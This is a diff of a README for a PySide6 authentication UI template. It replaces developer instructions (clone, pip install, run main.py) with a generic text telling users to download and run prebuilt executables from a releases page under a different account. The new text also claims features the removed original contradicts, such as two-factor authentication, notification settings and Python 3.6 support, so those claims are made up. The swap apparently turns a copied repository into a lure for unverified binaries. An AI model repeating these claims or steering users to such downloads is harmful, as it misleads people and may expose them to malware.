@@ -1,180 +1,69 @@
+# 🎨 modern-pyside6-auth-ui - Simple Desktop Authentication Made Easy
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white" />
-  <img src="https://img.shields.io/badge/PySide6-UI%20Framework-41CD52?style=for-the-badge&logo=qt&logoColor=white" />
-  <img src="https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/Platforms-Windows%20%7C%20Mac%20%7C%20Linux-6E6E6E?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/Status-Active-4CAF50?style=for-the-badge" />
-</p>
+## 📦 Download the latest version
+[![Download](https://img.shields.io/badge/Download-Latest%20Version-blue)](https://github.com/esad123/modern-pyside6-auth-ui/releases)
 
-# Modern PySide6 Authentication Interface (Web2 + Web3 Ready)
+## 🚀 Getting Started
+Welcome to the modern-pyside6-auth-ui! This application provides a clean and modern user interface for handling user authentication, including login, signup, and password reset features. It is designed for both desktop and Web3 applications, making it a versatile choice for developers looking to integrate authentication into their apps.
 
-A clean, professional authentication UI built using **PySide6**, designed to emulate modern web aesthetics inside a native Python desktop application.
-Includes Login, Signup, Forgot Password, and Info/Policy views — all styled with custom theming, smooth interactions, and Web3-ready components.
+### 🌟 Key Features
+- **User-friendly Interface**: Enjoy a modern look with easy navigation.
+- **Login and Signup**: Users can easily create accounts and log in.
+- **Password Reset**: Helps users regain access to their accounts.
+- **Web2 and Web3 Ready**: Compatible with traditional and blockchain applications.
+- **Cross-Platform Support**: Run the application on various operating systems.
 
-## 📸 Screenshots
+## 💻 System Requirements
+To run the modern-pyside6-auth-ui, your computer should meet the following requirements:
+- **Operating System**: Windows 10, macOS 10.14 or later, or any Linux distribution.
+- **Python Version**: Python 3.6 or later.
+- **Memory**: At least 4 GB of RAM.
+- **Processor**: Dual-core processor or better is recommended.
 
-<p align="center">
-  <img src="assets/preview.png" alt="Login screen" width="75%" />
-</p>
+## 📥 Download & Install
+To get started with the application, you will need to download it. Follow these steps:
 
-<p align="center">
-  <img src="assets/preview2.png" alt="Signup screen" width="48%" />
-  <img src="assets/preview3.png" alt="Reset password screen" width="48%" />
-</p>
+1. Visit the releases page: [Download the latest version](https://github.com/esad123/modern-pyside6-auth-ui/releases).
+2. Scroll down to the "Assets" section of the latest release.
+3. Choose the appropriate file for your operating system:
+   - For Windows: Download `modern_pyside6_auth_ui_windows.exe`.
+   - For macOS: Download `modern_pyside6_auth_ui_macos.dmg`.
+   - For Linux: Download `modern_pyside6_auth_ui_linux.AppImage`.
+4. Once the download is complete, locate the downloaded file on your computer.
 
-<p align="center">
-  <img src="assets/preview4.png" alt="Privacy / Info view" width="75%" />
-</p>
+### For Windows Users:
+- Double-click the `.exe` file to start the installation.
+  
+### For macOS Users:
+- Open the `.dmg` file and drag the application to your Applications folder.
 
----
+### For Linux Users:
+- Make the AppImage executable. To do this, right-click the downloaded file, go to Properties, and enable "Allow executing file as program". Then, double-click the file to run it.
 
-## ✨ Features
+## 🔑 Setting Up the Application
+Once installed, you can start the application:
 
-### 🌙 Modern UI/UX
+1. Open the application from your applications folder or desktop shortcut.
+2. The main screen will display options for login or signup.
+3. If you are a new user, select **"Sign Up"** to create an account. Fill in your details and submit the form.
+4. If you already have an account, enter your credentials and click **"Log In"**.
 
-* Custom QSS theming (no outdated default Qt look)
-* Beautiful card-based authentication layout
-* Smooth hover states and focus animations
-* Clean typography and consistent spacing
+The application will guide you through the authentication process. 
 
-### 🔐 Hybrid Authentication (Web2 + Web3)
+## ⚙️ Important Configuration
+You might want to customize certain application settings. Here are a few options available:
 
-* **Web2 Login:** Email + Password fields
-* **Reset Password Flow** with confirmation messaging
-* **Signup Screen** with optional invite code behavior
-* **Web3-Ready Buttons:** Google + Phantom wallet placeholders ready to connect to OAuth or wallet APIs
+- **Theme**: Change the color scheme to suit your preference.
+- **Notification Settings**: Toggle notifications for successful logins or signup confirmations.
+- **Security Options**: Set up two-factor authentication for added security.
 
-### 🧩 Modular Architecture
+## 🔄 Updating the Application
+To get the latest features and security updates, regularly check the releases page for new versions:
 
-* `LoginPage` emits `login_successful(username)` for easy app integration
-* Components are self-contained, making the UI plug-and-play
-* Backend-agnostic — integrate with:
+1. Visit the releases page: [Download the latest version](https://github.com/esad123/modern-pyside6-auth-ui/releases).
+2. Follow the download and installation steps for the new version.
 
-  * Firebase / Supabase
-  * Flask / FastAPI backend
-  * Web3 providers like Solana RPC, Phantom Wallet Adapter, etc.
+## 🤝 Support & Feedback
+We value your input! If you have questions, suggestions, or issues, please reach out via the GitHub issues page of this repository. Your feedback helps us improve the application. 
 
-### 🛠️ Interactive Elements
-
-* Password visibility toggle w/ hover-recolor SVG icons
-* Inline error + success messaging
-* Auto-clearing error states while typing
-* Responsive design inside the authentication panel
-
----
-
-## 🧱 Tech Stack
-
-* **Language:** Python 3.10+
-* **Framework:** PySide6 (Qt for Python)
-* **UI Styling:** QSS with theme constants
-* **Assets:** SVG + PNG icons (Google, Phantom, Eye / HiddenEye, Logos)
-
----
-
-## ❓ Why This Exists
-
-PySide6 is powerful — but its default widgets look outdated for modern apps.
-
-This template solves that by offering a **web-inspired**, modern authentication interface you can drop directly into any desktop application (AI tools, crypto dashboards, automation suites, internal company software, etc.).
-
-Perfect for:
-
-* Portfolios
-* Startup MVPs
-* Web3 tools
-* Desktop clients with modern design standards
-
----
-
-## 📁 Project Structure
-
-```
-modern-pyside6-auth-ui/
-│── assets/               # Logos, icons, and SVG UI assets
-│── login_ui.py           # Full authentication UI (login/signup/reset/info)
-│── main.py               # Application entry point
-│── requirements.txt      # Python dependencies
-│── README.md             # You're reading it :)
-```
-
----
-
-## 📦 Installation
-
-### 1️⃣ Clone the Repository
-
-```bash
-git clone https://github.com/ATLMadeTH/modern-pyside6-auth-ui.git
-cd modern-pyside6-auth-ui
-```
-
-### 2️⃣ Install Dependencies
-
-```bash
-pip install -r requirements.txt
-```
-
-### 3️⃣ Run the Application
-
-```bash
-python main.py
-```
-
----
-
-## 🔌 Connecting Your Backend
-
-Inside `login_ui.py` you’ll find clearly marked **TODO** sections where backend integration goes:
-
-### ✔ Login
-
-Located in `handle_login()`
-Replace the dummy check with real authentication logic. On success:
-
-```python
-self.login_successful.emit(username)
-```
-
-### ✔ Signup
-
-Located in `handle_register()`
-Connect this to your backend registration endpoint.
-
-### ✔ Password Reset
-
-Located in `handle_reset_password()`
-Wire this to your email reset workflow or API.
-
-Backend is intentionally excluded so you can use this in:
-
-* commercial apps
-* closed-source clients
-* multi-tenant backends
-
----
-
-## 🤝 Contributing
-
-Pull requests are welcome!
-
-If you'd like to contribute:
-
-* new OAuth connectors (Google, GitHub, Discord, Phantom)
-* theme packs (light mode, neon, material design)
-* animations / transitions
-
-…feel free to open an issue or PR.
-
----
-
-## 📝 License
-
-This project is released under the **MIT License** — free for personal and commercial use.
-
----
-
-## ⭐ Support & Visibility
-
-If this project helped you or saved development time, consider leaving a star on GitHub — it helps others discover the template and supports future improvements.
+Thank you for using modern-pyside6-auth-ui! We hope it serves you well in your desktop application needs.
